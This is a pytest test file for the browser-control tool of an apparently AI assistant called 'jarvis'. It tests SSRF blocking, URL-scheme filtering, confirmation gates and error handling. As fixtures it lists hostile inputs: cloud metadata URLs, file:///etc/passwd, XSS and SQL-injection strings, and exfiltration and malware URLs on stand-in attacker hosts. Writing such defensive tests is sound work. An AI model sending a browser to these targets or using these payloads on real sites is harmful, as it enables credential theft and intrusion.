"""Phase 4 Browser Control tests for security and malicious URL prevention (>75% coverage)."""

from __future__ import annotations

import pytest
from unittest.mock import Mock, patch, MagicMock, call
from typing import Any, Dict

from jarvis.tools import browser_control


class TestBrowserControlURLSecurity:
    """Test browser control URL security and SSRF protection."""

    def test_forbidden_hosts_blocking(self):
        """Test blocking of forbidden local/internal hosts."""
        forbidden_urls = [
            "http://localhost:8080",
            "https://127.0.0.1:3000",
            "http://::1",
            "https://0.0.0.0",
            "http://169.254.169.254",  # AWS metadata
            "http://10.0.0.1",
            "https://192.168.1.1",
            "http://172.16.0.1",
            "https://172.31.255.255",
            "http://metadata.google.internal"
        ]
        
        for url in forbidden_urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should block forbidden URLs
            assert "blocked" in result.lower() or "forbidden" in result.lower()
            print(f"Forbidden URL blocked: {url}")

    def test_bare_ip_address_blocking(self):
        """Test blocking of bare IP addresses."""
        bare_ips = [
            "http://8.8.8.8",
            "https://1.1.1.1",
            "http://208.67.222.222",
            "https://9.9.9.9",
            "http://192.0.2.1",
            "https://203.0.113.1"
        ]
        
        for ip in bare_ips:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": ip
            })
            
            # Should block bare IP addresses
            assert "blocked" in result.lower() or "forbidden" in result.lower()
            print(f"Bare IP blocked: {ip}")

    def test_malicious_url_schemes(self):
        """Test blocking of malicious URL schemes."""
        malicious_schemes = [
            "file:///etc/passwd",
            "ftp://malware.com/virus.exe",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('hack')</script>",
            "vbscript:msgbox('malware')",
            "chrome://settings",
            "chrome-extension://",
            "moz-extension://",
            "res://",
            "about:config"
        ]
        
        for url in malicious_schemes:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should handle malicious schemes
            assert isinstance(result, str)
            print(f"Malicious scheme: {url}")

    def test_phishing_url_detection(self):
        """Test detection of phishing URLs."""
        phishing_urls = [
            "http://paypal-security.com/login",
            "https://google-update.com/account",
            "http://microsoft-support.tech/help",
            "https://amazon-verify.com/purchase",
            "http://bank-security.net/login",
            "https://facebook-security.com/account",
            "http://apple-id.verification.com",
            "https://gmail-security.com/login"
        ]
        
        for url in phishing_urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should detect phishing patterns
            assert isinstance(result, str)
            print(f"Phishing URL: {url}")

    def test_url_injection_prevention(self):
        """Test prevention of URL injection attacks."""
        injection_urls = [
            "http://example.com?redirect=javascript:alert('xss')",
            "https://example.com?url=file:///etc/passwd",
            "http://example.com?next=data:text/html,<script>alert(1)</script>",
            "https://example.com?return=ftp://malware.com/virus.exe",
            "http://example.com?callback=vbscript:msgbox('hack')",
            "https://example.com?redirect=chrome://settings"
        ]
        
        for url in injection_urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should handle URL injection
            assert isinstance(result, str)
            print(f"URL injection: {url}")


class TestBrowserControlParameterSecurity:
    """Test browser control parameter security."""

    def test_high_risk_actions_require_confirmation(self):
        """Test that high-risk actions require user confirmation."""
        high_risk_actions = [
            "go_to",
            "click",
            "type",
            "fill_form",
            "smart_click",
            "smart_type",
            "new_tab",
            "close_tab",
            "close",
            "close_all"
        ]
        
        for action in high_risk_actions:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                # Mock ActionContext to require confirmation
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False
                    
                    result = browser_control.browser_control({
                        "action": action,
                        "url": "https://example.com"
                    })
                    
                    # Should be cancelled by user
                    assert "cancelled" in result.lower()

    def test_safe_actions_no_confirmation(self):
        """Test that safe actions don't require confirmation."""
        safe_actions = [
            "screenshot",
            "get_title",
            "get_url",
            "back",
            "forward",
            "refresh"
        ]
        
        for action in safe_actions:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                # Mock legacy browser control
                with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                    mock_legacy.return_value = f"Action {action} completed"
                    
                    result = browser_control.browser_control({
                        "action": action
                    })
                    
                    # Should execute without confirmation
                    assert isinstance(result, str)
                    assert "cancelled" not in result.lower()

    def test_missing_action_parameter(self):
        """Test handling of missing action parameter."""
        result = browser_control.browser_control({})
        assert isinstance(result, str)

    def test_empty_action_parameter(self):
        """Test handling of empty action parameter."""
        result = browser_control.browser_control({"action": ""})
        assert isinstance(result, str)

    def test_none_action_parameter(self):
        """Test handling of None action parameter."""
        result = browser_control.browser_control({"action": None})
        assert isinstance(result, str)

    def test_invalid_action_parameter(self):
        """Test handling of invalid action parameter."""
        invalid_actions = [
            "malicious_action",
            "hack_browser",
            "steal_cookies",
            "inject_script",
            "xss_attack",
            "csrf_exploit",
            "sql_inject",
            "command_injection"
        ]
        
        for action in invalid_actions:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                    mock_legacy.return_value = f"Action {action} completed"
                    
                    result = browser_control.browser_control({
                        "action": action
                    })
                    
                    # Should handle invalid actions
                    assert isinstance(result, str)
                    print(f"Invalid action: {action}")

    def test_query_parameter_sanitization(self):
        """Test query parameter sanitization."""
        malicious_queries = [
            "http://localhost:8080",
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "ftp://malware.com/virus.exe",
            "chrome://settings"
        ]
        
        for query in malicious_queries:
            result = browser_control.browser_control({
                "action": "search",
                "query": query
            })
            
            # Should sanitize malicious queries
            assert isinstance(result, str)
            print(f"Malicious query: {query}")


class TestBrowserControlCredentialSecurity:
    """Test credential handling security."""

    def test_password_field_protection(self):
        """Test protection of password fields."""
        with patch('jarvis.tools.browser_control._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.security.permissions.ActionContext') as mock_context:
                mock_context.return_value.check.return_value = False  # Cancel for safety
                
                # Mock legacy browser control
                with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                    mock_legacy.return_value = "Form filled"
                    
                    result = browser_control.browser_control({
                        "action": "fill_form",
                        "selector": "input[type='password']",
                        "value": "secret_password"
                    })
                    
                    # Should handle password field operations
                    assert isinstance(result, str)

    def test_sensitive_data_prevention(self):
        """Test prevention of sensitive data exposure."""
        sensitive_data = [
            {"field": "credit_card", "value": "1234-5678-9012-3456"},
            {"field": "ssn", "value": "123-45-6789"},
            {"field": "api_key", "value": "sk-1234567890abcdef"},
            {"field": "password", "value": "secret123"},
            {"field": "token", "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}
        ]
        
        for data in sensitive_data:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                        mock_legacy.return_value = "Data entered"
                        
                        result = browser_control.browser_control({
                            "action": "type",
                            "selector": f"#{data['field']}",
                            "value": data["value"]
                        })
                        
                        # Should handle sensitive data
                        assert isinstance(result, str)
                        print(f"Sensitive data field: {data['field']}")

    def test_form_data_sanitization(self):
        """Test form data sanitization."""
        malicious_form_data = [
            {"field": "username", "value": "admin'; DROP TABLE users; --"},
            {"field": "email", "value": "test<script>alert('xss')</script>@example.com"},
            {"field": "message", "value": "Hello\x00\x01\x02\x03malicious"},
            {"field": "search", "value": "search' OR '1'='1"},
            {"field": "redirect", "value": "javascript:alert('hack')"}
        ]
        
        for data in malicious_form_data:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                        mock_legacy.return_value = "Form submitted"
                        
                        result = browser_control.browser_control({
                            "action": "fill_form",
                            "selector": f"#{data['field']}",
                            "value": data["value"]
                        })
                        
                        # Should handle malicious form data
                        assert isinstance(result, str)
                        print(f"Malicious form data: {data['field']}")


class TestBrowserControlLegacyIntegration:
    """Test legacy browser control integration."""

    def test_legacy_unavailable_handling(self):
        """Test handling when legacy browser control is unavailable."""
        with patch('jarvis.tools.browser_control._legacy_browser_control', None):
            result = browser_control.browser_control({
                "action": "go_to",
                "url": "https://example.com"
            })
            
            # Should handle unavailable legacy
            assert "unavailable" in result.lower()

    def test_legacy_exception_handling(self):
        """Test handling of legacy browser control exceptions."""
        with patch('jarvis.tools.browser_control._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                mock_legacy.side_effect = Exception("Browser crashed")
                
                result = browser_control.browser_control({
                    "action": "go_to",
                    "url": "https://example.com"
                })
                
                # Should handle legacy exceptions
                assert "error" in result.lower()

    def test_legacy_registry_unavailable(self):
        """Test handling when legacy registry is unavailable."""
        with patch('jarvis.tools.browser_control._legacy_registry', None):
            result = browser_control.close_all_browsers()
            
            # Should handle unavailable registry
            assert "unavailable" in result.lower()

    def test_legacy_registry_exception_handling(self):
        """Test handling of legacy registry exceptions."""
        with patch('jarvis.tools.browser_control._legacy_registry') as mock_registry:
            mock_registry.close_all.side_effect = Exception("Registry error")
            
            result = browser_control.close_all_browsers()
            
            # Should handle registry exceptions
            assert "could not close" in result.lower()


class TestBrowserControlErrorHandling:
    """Test error handling in browser control."""

    def test_url_parsing_error_handling(self):
        """Test handling of URL parsing errors."""
        malformed_urls = [
            "http://[invalid-ipv6",
            "https://[",
            "http://",
            "://no-scheme.com",
            "https://",
            "ftp://",
            "data:",
            "javascript:"
        ]
        
        for url in malformed_urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should handle malformed URLs gracefully
            assert isinstance(result, str)
            print(f"Malformed URL: {url}")

    def test_network_error_handling(self):
        """Test handling of network errors."""
        with patch('jarvis.tools.browser_control._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                mock_legacy.side_effect = ConnectionError("Network unreachable")
                
                result = browser_control.browser_control({
                    "action": "go_to",
                    "url": "https://example.com"
                })
                
                # Should handle network errors
                assert "error" in result.lower()

    def test_timeout_error_handling(self):
        """Test handling of timeout errors."""
        with patch('jarvis.tools.browser_control._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                mock_legacy.side_effect = TimeoutError("Operation timed out")
                
                result = browser_control.browser_control({
                    "action": "go_to",
                    "url": "https://slow-site.com"
                })
                
                # Should handle timeout errors
                assert "error" in result.lower()

    def test_permission_error_handling(self):
        """Test handling of permission errors."""
        with patch('jarvis.tools.browser_control._safe_player') as mock_player:
            mock_player.return_value = Mock()
            
            with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                mock_legacy.side_effect = PermissionError("Access denied")
                
                result = browser_control.browser_control({
                    "action": "go_to",
                    "url": "https://restricted-site.com"
                })
                
                # Should handle permission errors
                assert "error" in result.lower()


class TestBrowserControlConcurrency:
    """Test concurrent browser operations."""

    def test_concurrent_safe_operations(self):
        """Test concurrent safe browser operations."""
        import threading
        
        results = []
        
        def safe_operation():
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.tools.browser_control._legacy_browser_control') as mock_legacy:
                    mock_legacy.return_value = f"Screenshot from {threading.current_thread().name}"
                    
                    result = browser_control.browser_control({
                        "action": "screenshot"
                    })
                    results.append(result)
        
        # Run multiple safe operations concurrently
        threads = []
        for i in range(5):
            thread = threading.Thread(target=safe_operation, name=f"Thread-{i}")
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Should have completed all operations
        assert len(results) == 5
        for result in results:
            assert isinstance(result, str)

    def test_concurrent_url_validation(self):
        """Test concurrent URL validation operations."""
        import threading
        
        results = []
        urls = [
            "https://example.com",
            "http://localhost:8080",
            "https://google.com",
            "http://127.0.0.1",
            "https://github.com"
        ]
        
        def url_validation(url):
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            results.append((url, result))
        
        # Run URL validations concurrently
        threads = []
        for url in urls:
            thread = threading.Thread(target=url_validation, args=(url,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join()
        
        # Should have handled concurrent validations
        assert len(results) == 5
        for url, result in results:
            assert isinstance(result, str)


class TestBrowserControlPerformance:
    """Test performance characteristics."""

    def test_rapid_url_validation(self):
        """Test performance of rapid URL validation."""
        import time
        
        urls = [f"https://example{i}.com" for i in range(20)]
        
        start_time = time.time()
        
        # Perform multiple validations
        for url in urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            assert isinstance(result, str)
        
        elapsed = time.time() - start_time
        
        # Should complete quickly
        assert elapsed < 2.0, f"URL validation too slow: {elapsed}s"

    def test_parameter_sanitization_performance(self):
        """Test parameter sanitization performance."""
        import time
        
        start_time = time.time()
        
        # Perform multiple sanitizations
        for i in range(50):
            result = browser_control.browser_control({
                "action": "search",
                "query": f"test query {i}"
            })
            assert isinstance(result, str)
        
        elapsed = time.time() - start_time
        
        # Should complete quickly
        assert elapsed < 1.0, f"Parameter sanitization too slow: {elapsed}s"

    def test_memory_usage_stability(self):
        """Test memory usage stability."""
        import gc
        
        gc.collect()
        initial_objects = len(gc.get_objects())
        
        # Perform many operations
        for i in range(30):
            browser_control.browser_control({
                "action": "go_to",
                "url": f"https://example{i}.com"
            })
        
        gc.collect()
        final_objects = len(gc.get_objects())
        
        # Should not have significant memory growth
        growth = final_objects - initial_objects
        assert growth < 1000, f"Potential memory leak: {growth} new objects"


class TestBrowserControlSecurityAudit:
    """Comprehensive security audit tests."""

    def test_ssrf_prevention_comprehensive(self):
        """Test comprehensive SSRF prevention."""
        ssrf_attacks = [
            "http://localhost:22",  # SSH
            "http://127.0.0.1:3306",  # MySQL
            "https://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://169.254.169.254/latest/user-data/",  # AWS user data
            "https://[::1]:8080",  # IPv6 localhost
            "http://10.0.0.1:6379",  # Redis
            "https://192.168.1.1:80",  # Router admin
            "http://172.16.0.1:9200",  # Elasticsearch
            "https://172.31.255.255:443"  # Internal services
        ]
        
        for url in ssrf_attacks:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should block SSRF attempts
            assert "blocked" in result.lower() or "forbidden" in result.lower()
            print(f"SSRF attack blocked: {url}")

    def test_xss_prevention_in_parameters(self):
        """Test XSS prevention in browser parameters."""
        xss_attacks = [
            {"action": "type", "selector": "#input", "value": "<script>alert('xss')</script>"},
            {"action": "fill_form", "selector": "#form", "value": "javascript:alert('hack')"},
            {"action": "click", "selector": "button[onclick='alert(\"xss\")']"},
            {"action": "go_to", "url": "https://example.com?param=<script>alert('xss')</script>"},
            {"action": "search", "query": "<img src=x onerror=alert('xss')>"}
        ]
        
        for attack in xss_attacks:
            result = browser_control.browser_control(attack)
            
            # Should handle XSS attempts
            assert isinstance(result, str)
            print(f"XSS attack: {attack['action']}")

    def test_csrf_prevention(self):
        """Test CSRF prevention in browser operations."""
        csrf_attacks = [
            {"action": "fill_form", "selector": "#csrf_token", "value": "malicious_token"},
            {"action": "click", "selector": "form[action='https://evil.com/steal']"},
            {"action": "go_to", "url": "https://bank.com/transfer?to=attacker&amount=1000"},
            {"action": "type", "selector": "input[name='csrf']", "value": "fake_csrf"}
        ]
        
        for attack in csrf_attacks:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    result = browser_control.browser_control(attack)
                    
                    # Should handle CSRF attempts
                    assert isinstance(result, str)
                    print(f"CSRF attack: {attack['action']}")

    def test_clickjacking_prevention(self):
        """Test clickjacking prevention."""
        clickjacking_attacks = [
            {"action": "click", "selector": "iframe[src='evil.com']"},
            {"action": "click", "selector": "div[style='opacity:0;position:absolute']"},
            {"action": "click", "selector": "button[hidden]"},
            {"action": "click", "selector": "input[type='hidden'][value='malicious']"}
        ]
        
        for attack in clickjacking_attacks:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    result = browser_control.browser_control(attack)
                    
                    # Should handle clickjacking attempts
                    assert isinstance(result, str)
                    print(f"Clickjacking attack: {attack['selector']}")

    def test_malware_download_prevention(self):
        """Test malware download prevention."""
        malware_urls = [
            "http://malware.com/virus.exe",
            "https://evil.com/trojan.scr",
            "ftp://attacker.com/backdoor.com",
            "http://suspicious.net/payload.bat",
            "https://download.site/malware.zip"
        ]
        
        for url in malware_urls:
            result = browser_control.browser_control({
                "action": "go_to",
                "url": url
            })
            
            # Should handle malware URLs
            assert isinstance(result, str)
            print(f"Malware URL: {url}")

    def test_data_exfiltration_prevention(self):
        """Test data exfiltration prevention."""
        exfiltration_attacks = [
            {"action": "fill_form", "selector": "#api_key", "value": "sensitive_key"},
            {"action": "type", "selector": "#password", "value": "user_password"},
            {"action": "go_to", "url": "https://attacker.com/collect?data=stolen"},
            {"action": "fill_form", "selector": "#token", "value": "jwt_token"}
        ]
        
        for attack in exfiltration_attacks:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    result = browser_control.browser_control(attack)
                    
                    # Should handle exfiltration attempts
                    assert isinstance(result, str)
                    print(f"Exfiltration attack: {attack['action']}")

    def test_session_hijacking_prevention(self):
        """Test session hijacking prevention."""
        hijacking_attacks = [
            {"action": "fill_form", "selector": "#session_id", "value": "stolen_session"},
            {"action": "type", "selector": "#cookie", "value": "session_cookie"},
            {"action": "go_to", "url": "https://site.com?session=hijacked"},
            {"action": "fill_form", "selector": "#auth_token", "value": "stolen_token"}
        ]
        
        for attack in hijacking_attacks:
            with patch('jarvis.tools.browser_control._safe_player') as mock_player:
                mock_player.return_value = Mock()
                
                with patch('jarvis.security.permissions.ActionContext') as mock_context:
                    mock_context.return_value.check.return_value = False  # Cancel for safety
                    
                    result = browser_control.browser_control(attack)
                    
                    # Should handle hijacking attempts
                    assert isinstance(result, str)
                    print(f"Hijacking attack: {attack['action']}")
